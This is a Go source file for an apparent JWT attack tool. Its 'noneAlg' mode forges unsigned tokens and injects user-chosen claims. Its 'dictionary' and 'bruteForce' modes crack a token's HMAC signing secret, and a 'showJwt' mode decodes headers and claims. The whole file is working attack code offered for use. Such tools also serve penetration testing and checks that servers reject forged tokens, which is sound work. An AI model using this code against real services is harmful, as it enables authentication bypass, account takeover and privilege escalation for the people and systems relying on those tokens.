package main

import (
	"os"
	"fmt"
	"bufio"
	"flag"
	"github.com/fatih/color"
	"github.com/dgrijalva/jwt-go"
	"encoding/json"
)

var parser jwt.Parser

var r = color.New(color.FgRed)
var y = color.New(color.FgYellow)
var c = color.New(color.FgCyan) 
var m = color.New(color.FgMagenta)

func main() {
	var attackType, jwtToken, wordlist, claims, alphabet string
	var passMaxLength int

	flag.StringVar(&jwtToken, "jwt", "", "Set jwt token (*)")
	flag.StringVar(&attackType, "attackType", "showJwt", "Select attack type: noneAlg, dictionary, showJwt, bruteForce")
	flag.StringVar(&wordlist, "wordlist", "", "Set dictionary path (?)")
	flag.StringVar(&claims, "claims", "", "Set claims that want to update or insert (?)")
	flag.IntVar(&passMaxLength, "passMaxLength", 4, "Set maximum character size of password for brute-force (?)")
	flag.StringVar(&alphabet, "alphabet", "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", "Set alphabet that want to usage for brute-force (?)")

	flag.Parse()

	if (jwtToken == "") {
		r.Println("Jwt parameter must be set")
		flag.PrintDefaults()
		return
	}

	switch attackType {
		case "dictionary":
			dictionaryAttack(jwtToken, wordlist)
			break
		case "noneAlg":
			noneAlgAttack(jwtToken,claims)
			break
		case "bruteForce":
			bruteForceAttack(jwtToken, passMaxLength, alphabet)
		default:
			showJwt(jwtToken)
			break
	}
}

func bruteForceAttack(jwtToken string, passMaxLength int, alphabet string)  {
	for secret := range generateSecret(alphabet, passMaxLength) {
		_, _, _, valid, err := parseToken(jwtToken, secret)

		if (valid || err.Error() == "Token is expired") {
			fmt.Println("Password:", secret)
		}
	}
}

func generateSecret(alphabet string, length int) <- chan string {
	c := make(chan string)

	go func(c chan string) {
		defer close(c) 
		addCharacter(c, "", alphabet, length) 
	}(c)

	return c 
}

func addCharacter(c chan string, combined string, alphabet string, length int) {
	if length <= 0 {
		return
	}
	
	var newStr string
	for _, ch := range alphabet {
		newStr = combined + string(ch)
		c <- newStr
		addCharacter(c, newStr, alphabet, length-1)
	}	
}

func noneAlgAttack(jwtToken string, claims string) {
	_, _, _claims, _, err := parseToken(jwtToken, "")

	if (err != nil){
		r.Println("Token was not parsed: ", err.Error())
		return
	}

	if (claims != "") {
		json.Unmarshal([]byte(claims), &_claims)
	}

	signToken(_claims, "", jwt.SigningMethodNone)
}

func dictionaryAttack(jwtToken string, wordlist string)  {
	file, err := os.Open(wordlist)

	if (err != nil){
		r.Println("Wordlist was not opened: " + err.Error())
		return
	}

	defer file.Close() 

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		_, _, _, valid, err := parseToken(jwtToken, scanner.Text())

		if (valid || err.Error() == "Token is expired") {
			fmt.Println("Password:", scanner.Text())
			return
		} else {
			r.Println("Password: " + scanner.Text())
		}
	}

}

func parseToken(jwtToken string, secret string) (*jwt.Token, map[string] interface{}, jwt.MapClaims, bool, error) {
	var token *jwt.Token
	var err error

	if (secret != ""){
		token, err = parser.Parse(jwtToken, func (token *jwt.Token) (interface{}, error) {
			return []byte(secret), nil
		})
	} else {
		token, _, err = parser.ParseUnverified(jwtToken, jwt.MapClaims{})
	}
	
	headers := token.Header
	claims := token.Claims
	valid := token.Valid

	return token, headers, claims.(jwt.MapClaims), valid, err
}

func signToken(claims jwt.MapClaims, secret string, alg jwt.SigningMethod) {
	var newToken string
	var err error

	signMethod := jwt.NewWithClaims(alg,claims)

	if (secret == "" || alg == jwt.SigningMethodNone){
		newToken, err = signMethod.SignedString(jwt.UnsafeAllowNoneSignatureType)
	} else {
		newToken, err = signMethod.SignedString(secret)
	}

	if (err != nil){
		r.Println("Token was not signed:" + err.Error())
		return
	}

	c.Println("***** New JWT *****")
	m.Println(newToken)
}

func showJwt(jwtToken string) {
	_, headers, claims, valid, err := parseToken(jwtToken, "")

	if (err != nil){
		r.Println("Token was not parsed: ", err.Error())
		return
	}

	c.Println("***** Headers *****")
	for k,v := range headers {
		m.Println(k + ":", v)
	}

	c.Println("***** Claims *****")
	for k,v := range claims {
		m.Println(k + ":", v)
	}

	c.Println("***** Validation *****")
	m.Println(valid)
}